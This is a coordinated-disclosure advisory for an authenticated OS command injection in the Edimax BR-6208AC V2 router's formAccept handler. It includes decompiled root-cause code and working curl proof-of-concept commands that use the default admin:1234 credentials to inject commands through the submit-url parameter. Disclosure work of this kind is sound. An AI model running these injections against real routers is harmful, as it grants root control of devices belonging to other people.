# OS Command Injection in Edimax BR-6208AC V2 formAccept Handler (`submit-url`)

> **Status:** CVE: Not assigned (identifier requested). Vendor notification: pending. Repository published for coordinated disclosure.

## Summary

The `formAccept` handler of the Edimax BR-6208AC V2 web management interface (firmware 1.03)
passes the POST parameter `submit-url` **directly to `system()` without any validation**. An
authenticated attacker can execute arbitrary shell commands with **root** privileges (the web
server runs as root).

## Affected Product

- Vendor: Edimax
- Product: BR-6208AC V2 (hardware version 2.0)
- Firmware: 1.03 — latest and final version (product is End-of-Life)

## Vulnerability Details

- Type: CWE-78 (OS Command Injection)
- Root cause: `sym.formAccept` @ 0x46f50c (handler body is only 156 bytes):

```c
void formAccept(int wp) {
    char *v = websGetVar(wp, "submit-url", "");   // attacker-controlled
    ...
    system(v);                                     // no validation at all
}
```

No length check, no character filter, no prefix/suffix pinning — the parameter value *is* the
command line.

## Proof of Concept (non-destructive)

```bash
# Run a network-observable, non-destructive command (ICMP ping-back):
curl -s -o /dev/null -w "%{http_code}\n" -u admin:1234 \
     --data-urlencode "submit-url=ping -c 3 192.168.2.10" \
     http://192.168.2.1/goform/formAccept
# Observed: HTTP 302, and three ICMP echo requests from the router arrive at 192.168.2.10
# (verified with tcpdump on the attacker host).
```

Independently verified in a rehosted firmware environment: a marker file was created as `uid=0`:

```
$ curl -u admin:1234 --data-urlencode "submit-url=touch /tmp/PROOF_ACCEPT" \
       http://127.0.0.1:18480/goform/formAccept        -> HTTP 302
$ docker exec br6208ac-web ls -l /tmp/PROOF_ACCEPT
-rw-r--r-- 1 root root 0 Oct 12 22:41 /tmp/PROOF_ACCEPT   # uid=0
```

Control: omitting `submit-url` executes nothing (empty default).

## Impact

- Attacker: any client with valid web-admin credentials. Note the device ships with factory
  default credentials `admin/1234` which the 401 realm string actively discloses
  (see `../01-webs-401-preauth-dos`), so on un-hardened devices this is effectively
  pre-authentication.
- Effect: full remote command execution as root — configuration tampering, persistence,
  traffic interception, botnet enrollment.

## Related Work

The same handler/parameter/root cause on the sibling model BR-6478AC (firmware 1.23) is covered
by **CVE-2026-9440** (VulDB, June 2026 reporter batch). This report concerns the independently
built **BR-6208AC V2** firmware; per that CNA's per-product assignment practice (e.g.
CVE-2025-15256/15257/15258 on this very model), a separate identifier is warranted. ELVIS (2020)
documented a *different* root cause in `formAccept` of BR-6428nC (a 200-byte stack buffer
overflow in `submit-url` handling, no CVE) — unrelated to this command injection.

## CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = **7.2 (High)**
Authenticated (PR:H) full root code execution. Devices retaining factory credentials raise the
effective severity to pre-authentication.

## Discovery

Discovered by Zimo-666 on 2026-10-12 via full attack-surface mapping (105 goform handlers),
sink census, static taint triage and dynamic verification on rehosted firmware. Vendor
notified: see top-level README.
